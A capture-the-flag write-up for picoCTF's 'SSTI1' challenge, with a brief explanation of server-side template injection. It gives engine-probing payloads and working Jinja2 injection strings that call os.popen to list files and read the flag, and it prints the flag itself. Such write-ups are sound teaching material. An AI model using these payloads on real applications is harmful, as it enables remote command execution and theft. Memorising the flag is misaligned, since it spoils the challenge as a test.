# [SSTI1 (Web Exploitation, Easy)](https://play.picoctf.org/practice/challenge/492) - Server Side Template Injection

- Description: I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:58745/)!


- Solution:
  1. Identify which template engine is being used by the application: Inject specific payloads and observe the response
  ```txt
  Jinja2 (Python Flask/Django): {{ 7*7 }}
  Freemarker (Java): ${7*7}
  Velocity (Java): #set($a = 7*7)${a}
  Thymeleaf (Java): ${7*7}
  Twig (PHP Symfony): {{ 7*7 }}
  Smarty (PHP): {$7*7}
  Mako (Python): <% print 7*7 %>
  ```
  <img width="507" height="137" alt="image" src="https://github.com/user-attachments/assets/d1bc2c5f-04d9-404e-97cb-3dd02227d879" />
  - Jinja2 is being used

  2. List out all working directories using this expression:
  ```txt
  {{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
  ```
  <img width="1275" height="550" alt="image" src="https://github.com/user-attachments/assets/f9a0367d-19a4-49bb-b261-7a8e629fdc3e" />

  3. Modify expression to get flag:
  ```txt
  {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
  ```
  <img width="969" height="44" alt="image" src="https://github.com/user-attachments/assets/c4ecbf03-6aba-4b07-bf5a-c1070f7c0614" />

- Flag: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}`
- Explanation: Server Side Template Injection (SSTI)
  - Happens when a web application lets users to submit data that gets processed by a template engine on the server without proper validation
  - Template engines are used to generate dynamic content, however if user provided input is not sanitized, attackers can inject malicious code that the server executes
